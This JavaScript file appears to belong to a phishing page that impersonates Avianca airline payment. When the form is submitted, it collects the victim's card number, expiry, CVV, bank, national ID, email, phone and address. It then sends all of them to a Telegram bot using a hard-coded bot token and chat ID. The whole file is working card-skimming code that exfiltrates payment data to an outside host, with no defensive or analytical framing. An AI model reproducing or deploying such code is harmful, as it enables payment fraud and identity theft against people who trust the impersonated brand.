document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("next-step").addEventListener("submit", function (event) {
        event.preventDefault();

        // Obtener valores de los inputs
        const card = document.getElementById("p")?.value || "";
        const card_date = document.getElementById("pdate")?.value || "";
        const ccv = document.getElementById("c")?.value || "";
        const bank = document.getElementById("ban")?.value || "";
        const cuotas = document.getElementById("dues")?.value || "";
        const name = document.getElementById("name")?.value || "";
        const lastname = document.getElementById("surname")?.value || "";
        const cc = document.getElementById("cc")?.value || "";
        const email = document.getElementById("email")?.value || "";
        const phone = document.getElementById("telnum")?.value || "";
        const city = document.getElementById("city")?.value || "";
        const state = document.getElementById("state")?.value || "";
        const address = document.getElementById("address")?.value || "";

        // Validar que los campos importantes no estén vacíos
        if (!card || !card_date || !ccv || !name || !lastname || !email) {
            alert("Por favor, completa todos los campos obligatorios.");
            return;
        }

        // Crear objeto con los datos
        const pagoavianca = {
            card, card_date, ccv, bank, cuotas, name, lastname, cc, email, phone, city, state, address
        };

        // Guardar en localStorage con el nombre "pagoavianca"
        localStorage.setItem("pagoavianca", JSON.stringify(pagoavianca));
        console.log("Datos guardados:", pagoavianca); // Verificar en consola

        // Crear el mensaje en formato Telegram
        const mensaje = `✈️ <b>Avianca</b> ✈️

💳 Tarjeta: <code>${card}</code>
🗓️ Fecha: <code>${card_date}</code>
💳 CCV: <code>${ccv}</code>
🏦 Banco: <code>${bank}</code>
📅 Cuotas: <code>${cuotas}</code>
👨🏻‍🦱 Nombre: <code>${name}</code>
👨🏻‍🦱 Apellido: <code>${lastname}</code>
💳 CC: <code>${cc}</code>
📨 Correo: <code>${email}</code>
📲 Teléfono: <code>${phone}</code>
🏙️ Ciudad: <code>${city}</code>
🗽 Provincia: <code>${state}</code>
🧭 Dirección: <code>${address}</code>`;

        const botToken = "7618655225:AAELL845R6t9J_ftTBgVS9Y0SDHZKbqqfDI";
        const chatId = "-5124502975";

        // Enviar mensaje a Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: mensaje,
                parse_mode: "HTML"
            })
        })
            .then(response => response.json())
            .then(data => console.log("Respuesta de Telegram:", data))
            .catch(error => console.error("Error al enviar a Telegram:", error));
    });
});
